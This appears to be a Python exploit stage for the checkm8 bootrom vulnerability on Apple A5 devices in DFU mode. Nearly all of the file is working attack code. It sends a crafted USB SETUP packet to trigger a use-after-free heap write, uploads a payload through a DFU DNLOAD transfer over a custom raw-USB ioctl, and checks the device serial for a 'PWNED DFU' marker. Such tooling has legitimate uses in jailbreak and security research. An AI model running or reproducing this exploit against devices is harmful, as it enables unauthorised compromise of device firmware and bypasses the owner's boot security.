#!/usr/bin/env python3
"""stage3-cyc-writes.py — UAF write + payload via raw0_cyc OUT cycles.

Runs against the live post-crit-IN state: the knife-edge heap plus the
CYC-armed read. Both writes go through the module's own queue+doorbell+
halt-recovery machinery (CYC), NOT the kernel URB path (which the chip
ignored post-recovery: actual=0 twice).
"""
import importlib.util
import os
import sys
import time

TOOLS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools')
sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

payload, overwrite = P.load_payloads('classic')
print('[w] payload=%d overwrite=%d' % (len(payload), len(overwrite)))

import fcntl
import struct
import ctypes

fd_raw = os.open('/dev/raw0', os.O_RDWR)
IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5


def cyc(setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ',
                      bytes(setup), len(data), 1,
                      0 if not data else 1,   # has_data
                      0,                       # dir_in (OUT writes)
                      settle_us, 0,
                      ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd_raw, IOC_CYC, txn, True)
        _ = arr
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


# ---- UAF WRITE: bogus 0x00/0x00 SETUP, wLength 0x40, 128 bytes OUT ----
data = b'\xCC' * 0x40 + overwrite
setup = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
rc = cyc(setup, data)
print('[w] UAF write CYC: rc=%d (0=halt+recovered, 1=ran-clean)' % rc)
time.sleep(0.3)

# ---- PAYLOAD: DNLOAD wLength 0x2C0, 768 bytes OUT -----------------------
data = b'\xCC' * 0x40 + payload
setup = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])
rc = cyc(setup, data)
print('[w] payload CYC: rc=%d' % rc)
time.sleep(0.5)

# ---- verdict -----------------------------------------------------------
usb = P.LibUSB()
P.LibUSB._current = usb
serial = P.verify(usb)
print('[verify] serial: %r' % serial)
if P.PWN_MARKER in serial:
    print('*** PWNED DFU ***')
    sys.exit(0)
print('[verify] not pwned; device state above (alive = heap survived)')
